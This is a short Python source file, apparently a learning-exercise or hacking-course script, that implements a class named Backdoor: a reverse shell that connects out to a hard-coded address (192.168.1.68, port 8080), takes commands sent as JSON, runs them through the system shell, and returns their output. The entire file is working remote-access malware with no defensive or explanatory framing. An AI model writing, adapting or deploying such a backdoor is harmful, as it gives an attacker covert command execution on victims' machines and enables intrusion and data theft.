import os
import socket
import subprocess
import json


class Backdoor:
    def __init__(self, ip, port):
        self.port = port
        self.ip = ip

        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port))

    def reliable_send(self, data):
        try:
            data = data.decode("utf-8")
        except:
            pass

        json_data = json.dumps(data)
        json_data = json_data.encode("utf-8")
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = self.connection.recv(1024)
        json_data = json_data.decode("utf-8")
        command = json.loads(json_data)
        command = command.split(" ")
        return command

    def change_directory_tool(self, path):
        try:
            if path:
                os.chdir(path)
                return f"[+] Changing working directory to {path}"
        except:
            return "[-] No such file or directory"

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError:
            self.reliable_send("[-] Unknown command")

    def run(self):
        while True:
            command = self.reliable_receive()

            if command[0] == "exit":
                self.connection.close()
                exit()

            elif command[0] == "cd" and len(command) >= 2:
                command_result = self.change_directory_tool(command[1])

            else:
                command_result = self.execute_system_command(command)
            self.reliable_send(command_result)


if __name__ == "__main__":
    ip = "192.168.1.68"
    port = 8080

    backdoor = Backdoor(ip, port)
    backdoor.run()


